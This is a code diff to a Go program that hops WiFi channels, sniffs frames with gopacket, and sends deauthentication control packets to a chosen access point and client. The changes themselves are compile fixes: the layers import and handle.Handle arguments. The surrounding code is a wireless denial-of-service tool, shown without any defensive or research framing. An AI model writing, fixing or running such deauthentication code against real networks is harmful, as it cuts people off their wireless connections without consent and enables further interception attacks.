@@ -23,6 +23,7 @@ import (
 	"time"
 
 	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
 
@@ -73,18 +74,18 @@ func channelHop(interfaceName string) {
 func capturePackets() {
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
-		ethLayer := packet.Layer(gopacket.LayerTypeEthernet)
+		ethLayer := packet.Layer(layers.LayerTypeEthernet)
 		if ethLayer == nil {
 			continue
 		}
 
-		ethernet := ethLayer.(*gopacket.Ethernet)
+		ethernet := ethLayer.(*layers.Ethernet)
 
 		if ethernet.SrcMAC.String() == args.targetAP.String() {
 			if args.targetClient != nil {
 				if ethernet.DstMAC.String() == args.targetClient.String() {
 					C.send_control_packet(
-						handle,
+						handle.Handle,
 						(*C.uint8_t)(&args.targetAP[0]),
 						(*C.uint8_t)(&args.targetClient[0]),
 						C.DEAUTH,
@@ -93,7 +94,7 @@ func capturePackets() {
 				}
 			} else {
 				C.send_control_packet(
-					handle,
+					handle.Handle,
 					(*C.uint8_t)(&args.targetAP[0]),
 					nil,
 					C.DEAUTH,
